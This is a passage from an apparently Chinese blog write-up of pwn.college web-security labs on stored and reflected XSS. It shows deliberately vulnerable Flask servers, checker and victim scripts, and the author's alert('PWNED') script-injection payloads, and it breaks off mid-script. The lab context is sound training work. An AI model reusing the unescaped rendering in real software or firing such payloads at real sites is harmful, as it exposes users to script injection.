<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests  <span class="comment"># 导入用于发送 HTTP 请求的 requests 库</span></span><br><span class="line"><span class="keyword">import</span> psutil    <span class="comment"># 导入用于查看系统状态和进程信息的 psutil 库</span></span><br><span class="line"><span class="keyword">import</span> sys       <span class="comment"># 导入系统级的库，用于退出程序等</span></span><br><span class="line"><span class="keyword">import</span> re        <span class="comment"># 导入正则表达式库，用于匹配和操作字符串</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取所有当前监听的端口（IPv4类型）</span></span><br><span class="line">open_ports = &#123; s.laddr.port <span class="keyword">for</span> s <span class="keyword">in</span> psutil.net_connections(kind=<span class="string">&quot;inet&quot;</span>) <span class="keyword">if</span> s.status == <span class="string">&#x27;LISTEN&#x27;</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果 80 端口没有在监听，表示服务没有运行，程序退出</span></span><br><span class="line"><span class="keyword">if</span> <span class="number">80</span> <span class="keyword">not</span> <span class="keyword">in</span> open_ports:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Service doesn&#x27;t seem to be running?&quot;</span>)  <span class="comment"># 输出错误信息</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)  <span class="comment"># 退出程序，状态码为1表示有错误发生</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置挑战的 URL，假设服务运行在本地的 80 端口</span></span><br><span class="line">challenge_url = <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取存储在 /flag 文件中的 flag 内容</span></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>).read().strip()  <span class="comment"># 读取 flag 文件并去掉多余的空白字符</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出正在访问的 URL</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Visiting <span class="subst">&#123;challenge_url&#125;</span>...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试访问 challenge_url，获取页面内容并分析其中的 &lt;input&gt; 标签的数量</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 使用正则表达式匹配页面中所有的 &lt;input&gt; 标签，count 返回匹配的数量</span></span><br><span class="line">    num_inputs = <span class="built_in">len</span>(re.findall(<span class="string">r&quot;&lt;input[^&lt;]*&gt;&quot;</span>, requests.get(challenge_url, timeout=<span class="number">1</span>).text))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果 &lt;input&gt; 标签的数量小于或等于 2，输出提示信息</span></span><br><span class="line">    <span class="keyword">if</span> num_inputs &lt;= <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;You did not inject an &lt;input&gt; textbox...&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 如果页面中有超过 2 个 &lt;input&gt; 标签，说明成功注入了文本框，输出 flag</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;You got it! Here is your flag:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(flag)  <span class="comment"># 打印 flag</span></span><br><span class="line"><span class="keyword">except</span> requests.exceptions.ConnectionError:</span><br><span class="line">    <span class="comment"># 如果出现连接错误，表示无法访问该 URL，可能是服务未运行</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Connection error... Is the service running?&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-15-XSS-2"><a href="#3-15-XSS-2" class="headerlink" title="3.15 XSS 2"></a>3.15 XSS 2</h3><p>这个是要我们注入一个<code>javascript alert(&quot;PWN&quot;)</code>具体代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标 URL</span></span><br><span class="line">url = <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># POST 数据，注入一个 alert(&quot;PWNED&quot;) 的脚本</span></span><br><span class="line">data = &#123;<span class="string">&quot;content&quot;</span>: <span class="string">&quot;&lt;script&gt;alert(&#x27;PWNED&#x27;);&lt;/script&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查请求是否成功</span></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Payload injected successfully!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Failed to inject payload.&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>server代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tempfile  <span class="comment"># 用于创建临时文件</span></span><br><span class="line"><span class="keyword">import</span> sqlite3   <span class="comment"># 用于SQLite数据库操作</span></span><br><span class="line"><span class="keyword">import</span> flask     <span class="comment"># 导入Flask框架，构建Web应用</span></span><br><span class="line"><span class="keyword">import</span> os        <span class="comment"># 用于访问操作系统功能，如生成随机密钥</span></span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)  <span class="comment"># 创建Flask应用对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个临时的数据库类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TemporaryDB</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 创建一个临时数据库文件，suffix=&quot;.db&quot;表示文件后缀为.db</span></span><br><span class="line">        self.db_file = tempfile.NamedTemporaryFile(<span class="string">&quot;x&quot;</span>, suffix=<span class="string">&quot;.db&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, sql, parameters=(<span class="params"></span>)</span>):</span><br><span class="line">        <span class="comment"># 创建数据库连接</span></span><br><span class="line">        connection = sqlite3.connect(self.db_file.name)</span><br><span class="line">        connection.row_factory = sqlite3.Row  <span class="comment"># 设置返回结果为行的形式，方便通过字段名访问</span></span><br><span class="line">        cursor = connection.cursor()  <span class="comment"># 创建数据库游标</span></span><br><span class="line">        result = cursor.execute(sql, parameters)  <span class="comment"># 执行SQL语句</span></span><br><span class="line">        connection.commit()  <span class="comment"># 提交事务</span></span><br><span class="line">        <span class="keyword">return</span> result  <span class="comment"># 返回执行结果</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化临时数据库</span></span><br><span class="line">db = TemporaryDB()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个名为 posts 的表，并插入一条初始数据</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;CREATE TABLE posts AS SELECT &quot;First Post!&quot; AS content&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理 POST 请求，用于提交内容</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_post</span>():</span><br><span class="line">    <span class="comment"># 获取表单中提交的内容，默认为空字符串</span></span><br><span class="line">    content = flask.request.form.get(<span class="string">&quot;content&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 将提交的内容插入到数据库的 posts 表中</span></span><br><span class="line">    db.execute(<span class="string">&quot;INSERT INTO posts VALUES (?)&quot;</span>, [content])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提交后重定向回当前页面</span></span><br><span class="line">    <span class="keyword">return</span> flask.redirect(flask.request.path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理 GET 请求，用于获取并显示当前所有帖子</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_get</span>():</span><br><span class="line">    <span class="comment"># HTML 页面初始内容</span></span><br><span class="line">    page = <span class="string">&quot;&lt;html&gt;&lt;body&gt;\nWelcome to pwnpost, the anonymous posting service. Post away!\n&quot;</span></span><br><span class="line">    page += <span class="string">&quot;&lt;form method=post&gt;Post:&lt;input type=text name=content&gt;&lt;/form&gt;\n&quot;</span>  <span class="comment"># 提交表单，用户可以输入内容</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从数据库中获取所有的帖子内容并显示</span></span><br><span class="line">    <span class="keyword">for</span> post <span class="keyword">in</span> db.execute(<span class="string">&quot;SELECT content FROM posts&quot;</span>).fetchall():</span><br><span class="line">        page += <span class="string">&quot;&lt;hr&gt;&quot;</span> + post[<span class="string">&quot;content&quot;</span>] + <span class="string">&quot;\n&quot;</span>  <span class="comment"># 为每个帖子内容添加水平分隔线</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> page + <span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>  <span class="comment"># 返回整个页面</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置Flask应用的密钥，用于会话管理等</span></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置Flask应用的服务器名称，用于生成完整的URL</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:80&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动Flask应用，监听80端口</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, <span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>victim代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tempfile  <span class="comment"># 用于创建临时文件</span></span><br><span class="line"><span class="keyword">import</span> sqlite3   <span class="comment"># 用于SQLite数据库操作</span></span><br><span class="line"><span class="keyword">import</span> flask     <span class="comment"># 导入Flask框架，构建Web应用</span></span><br><span class="line"><span class="keyword">import</span> os        <span class="comment"># 用于访问操作系统功能，如生成随机密钥</span></span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)  <span class="comment"># 创建Flask应用对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个临时的数据库类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TemporaryDB</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 创建一个临时数据库文件，suffix=&quot;.db&quot;表示文件后缀为.db</span></span><br><span class="line">        self.db_file = tempfile.NamedTemporaryFile(<span class="string">&quot;x&quot;</span>, suffix=<span class="string">&quot;.db&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, sql, parameters=(<span class="params"></span>)</span>):</span><br><span class="line">        <span class="comment"># 创建数据库连接</span></span><br><span class="line">        connection = sqlite3.connect(self.db_file.name)</span><br><span class="line">        connection.row_factory = sqlite3.Row  <span class="comment"># 设置返回结果为行的形式，方便通过字段名访问</span></span><br><span class="line">        cursor = connection.cursor()  <span class="comment"># 创建数据库游标</span></span><br><span class="line">        result = cursor.execute(sql, parameters)  <span class="comment"># 执行SQL语句</span></span><br><span class="line">        connection.commit()  <span class="comment"># 提交事务</span></span><br><span class="line">        <span class="keyword">return</span> result  <span class="comment"># 返回执行结果</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化临时数据库</span></span><br><span class="line">db = TemporaryDB()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个名为 posts 的表，并插入一条初始数据</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;CREATE TABLE posts AS SELECT &quot;First Post!&quot; AS content&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理 POST 请求，用于提交内容</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_post</span>():</span><br><span class="line">    <span class="comment"># 获取表单中提交的内容，默认为空字符串</span></span><br><span class="line">    content = flask.request.form.get(<span class="string">&quot;content&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 将提交的内容插入到数据库的 posts 表中</span></span><br><span class="line">    db.execute(<span class="string">&quot;INSERT INTO posts VALUES (?)&quot;</span>, [content])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提交后重定向回当前页面</span></span><br><span class="line">    <span class="keyword">return</span> flask.redirect(flask.request.path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理 GET 请求，用于获取并显示当前所有帖子</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_get</span>():</span><br><span class="line">    <span class="comment"># HTML 页面初始内容</span></span><br><span class="line">    page = <span class="string">&quot;&lt;html&gt;&lt;body&gt;\nWelcome to pwnpost, the anonymous posting service. Post away!\n&quot;</span></span><br><span class="line">    page += <span class="string">&quot;&lt;form method=post&gt;Post:&lt;input type=text name=content&gt;&lt;/form&gt;\n&quot;</span>  <span class="comment"># 提交表单，用户可以输入内容</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从数据库中获取所有的帖子内容并显示</span></span><br><span class="line">    <span class="keyword">for</span> post <span class="keyword">in</span> db.execute(<span class="string">&quot;SELECT content FROM posts&quot;</span>).fetchall():</span><br><span class="line">        page += <span class="string">&quot;&lt;hr&gt;&quot;</span> + post[<span class="string">&quot;content&quot;</span>] + <span class="string">&quot;\n&quot;</span>  <span class="comment"># 为每个帖子内容添加水平分隔线</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> page + <span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>  <span class="comment"># 返回整个页面</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置Flask应用的密钥，用于会话管理等</span></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置Flask应用的服务器名称，用于生成完整的URL</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:80&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动Flask应用，监听80端口</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, <span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-16-XSS-3"><a href="#3-16-XSS-3" class="headerlink" title="3.16 XSS 3"></a>3.16 XSS 3</h3><p>这个题要我们执行一个<strong>反射型 XSS</strong>注入：服务器通过 <code>flask.request.args.get(&quot;msg&quot;, &quot;(none)&quot;)</code> 获取 URL 参数 <code>msg</code>，并将其直接渲染到 HTML 中：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The message: &#123;flask.request.args.get(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;(none)&quot;</span>)&#125;</span><br><span class="line">        &lt;hr&gt;&lt;form&gt;Craft a message:&lt;<span class="built_in">input</span> <span class="built_in">type</span>=text name=msg&gt;&lt;<span class="built_in">input</span> <span class="built_in">type</span>=submit value=Submit&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>因此我们在victim中直接通过<code>/challenge/victim &quot;http://challenge.localhost:80/?msg=&lt;script&gt;alert(&#39;PWNED&#39;);&lt;/script&gt;&quot;</code> 注入脚本</p>
<p>server代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> flask   <span class="comment"># 导入 Flask 库，用于构建 Web 应用</span></span><br><span class="line"><span class="keyword">import</span> os      <span class="comment"># 导入 os 库，用于操作系统级别的功能（例如生成随机密钥）</span></span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)  <span class="comment"># 创建一个 Flask 应用对象</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)  </span><span class="comment"># 定义路由，监听 GET 请求，访问根路径 &quot;/&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_get</span>():</span><br><span class="line">    <span class="comment"># 返回一个包含 HTML 内容的响应</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;&lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;pwnmsg ephemeral message service&lt;/h1&gt;  &lt;!-- 标题部分，显示服务名称 --&gt;</span></span><br><span class="line"><span class="string">        The message: <span class="subst">&#123;flask.request.args.get(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;(none)&quot;</span>)&#125;</span>  &lt;!-- 获取 URL 参数 &quot;msg&quot; 并显示，如果没有该参数，则显示 &quot;(none)&quot; --&gt;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;  &lt;!-- 分隔线 --&gt;</span></span><br><span class="line"><span class="string">        &lt;form&gt;  &lt;!-- 表单部分，用户可以输入消息 --&gt;</span></span><br><span class="line"><span class="string">            Craft a message:&lt;input type=text name=msg&gt;  &lt;!-- 输入框，name 为 &quot;msg&quot; --&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=submit value=Submit&gt;  &lt;!-- 提交按钮 --&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 当访问根路径时，浏览器会展示上面定义的 HTML 页面，</span></span><br><span class="line">    <span class="comment"># 其中包含了输入框，用户可以在输入框中输入内容并提交，提交的内容将通过 URL 参数 &quot;msg&quot; 传递给服务器</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 Flask 应用的 secret_key，用于保护会话数据和其他加密操作</span></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置服务器的名称和端口（例如，URL 为 http://challenge.localhost:80）</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:80&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 Flask Web 服务器，在本地的 80 端口监听 HTTP 请求</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, <span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>victim代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> psutil  <span class="comment"># 导入用于处理进程和系统信息的库</span></span><br><span class="line"><span class="keyword">import</span> urllib  <span class="comment"># 导入用于 URL 解析和操作的库</span></span><br><span class="line"><span class="keyword">import</span> atexit   <span class="comment"># 导入用于程序退出时执行清理操作的库</span></span><br><span class="line"><span class="keyword">import</span> time     <span class="comment"># 导入用于时间操作的库</span></span><br><span class="line"><span class="keyword">import</span> sys      <span class="comment"># 导入系统级功能的库，用于获取命令行参数和退出程序</span></span><br><span class="line"><span class="keyword">import</span> os       <span class="comment"># 导入操作系统级别的功能，如环境变量、权限设置等</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入 Selenium WebDriver 库以及其相关配置，用于自动化浏览器操作</span></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.firefox.options <span class="keyword">import</span> Options <span class="keyword">as</span> FirefoxOptions  <span class="comment"># Firefox 浏览器的配置</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.firefox.service <span class="keyword">import</span> Service <span class="keyword">as</span> FirefoxService  <span class="comment"># 用于启动 Firefox 浏览器的服务</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By  <span class="comment"># 用于查找页面元素的方法</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.wait <span class="keyword">import</span> WebDriverWait  <span class="comment"># 用于显式等待，等待某些条件满足</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC  <span class="comment"># 用于定义等待条件</span></span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> TimeoutException, WebDriverException  <span class="comment"># 用于捕获超时和浏览器异常</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置程序的 UID 为当前用户的有效 UID</span></span><br><span class="line">os.setuid(os.geteuid())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空当前环境变量，确保程序在干净的环境下运行</span></span><br><span class="line">os.environ.clear()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置系统的 PATH 环境变量，确保必要的系统命令可以正确执行</span></span><br><span class="line">os.environ[<span class="string">&quot;PATH&quot;</span>] = <span class="string">&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置 Firefox 浏览器的选项，开启无头模式</span></span><br><span class="line">options = FirefoxOptions()</span><br><span class="line">options.add_argument(<span class="string">&quot;--headless&quot;</span>)  <span class="comment"># 启用无头模式，浏览器界面不会显示</span></span><br><span class="line">service = FirefoxService(log_path=<span class="string">&quot;/dev/null&quot;</span>)  <span class="comment"># 创建 Firefox 服务实例，忽略日志</span></span><br><span class="line">browser = webdriver.Firefox(service=service, options=options)  <span class="comment"># 创建一个 Firefox 浏览器的 WebDriver 实例</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 确保在程序退出时正确关闭浏览器</span></span><br><span class="line">atexit.register(browser.quit)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查命令行参数，确保提供了 URL 参数</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Usage: <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> URL&quot;</span>)  <span 